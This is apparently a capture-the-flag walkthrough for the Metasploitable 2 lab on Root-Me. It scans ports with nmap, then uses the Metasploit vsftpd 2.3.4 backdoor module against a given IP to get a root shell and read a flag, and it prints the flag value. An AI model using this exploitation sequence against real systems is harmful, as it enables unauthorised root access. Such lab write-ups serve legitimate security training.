# Metasploitable 2

Start by scaning open ports !
```
nmap -sS --min-rate 5000 --open -Pn -n -vvv -p- ctf01.root-me.org -oG allPorts
```

Check details for open ports
```
nmap -sC -sV -p21,22,23,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787,33365,34314,38911,47920 ctf01.root-me.org -oN targeted
```
> There are a lot but just the first one is usefull

Let's check carefully the ```targeted``` file that we just created. Notice this
```
21/tcp    open  ftp         vsftpd 2.3.4
```

The version seems to be deprecated ! let's check some exploits !
```
searchsploit vsftpd 2.3.4
```

We find two !
```
vsftpd 2.3.4 - Backdoor Command Execution
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
```

This script seems to not workking... let's try another method !

Method 2 using msfconsole !
```
msfconsole
```

Let's check for best exploits
```
search vsftp
```

We find this exploit !
```
exploit/unix/ftp/vsftpd_234_backdoor
```

So let's use it
```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
```

Ok, need to know the options
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

Have to set the ```rhost``` !
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 212.129.28.18
```
> Can know the ip with whatweb ctf01-root-me.org

Let's run it !
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```
> If the exploit doesn't work, try it again !

We're supposed to have a shell, if not write in your terminal
```
shell
```

In the interective shell, let's check who we are
```
id
```

We are ```root```, let's check the flag at the path ```/passwd```
```
cat passwd
```

We've got it !
```
e921bd2863edf595a6179721c81256f4
```

Done !
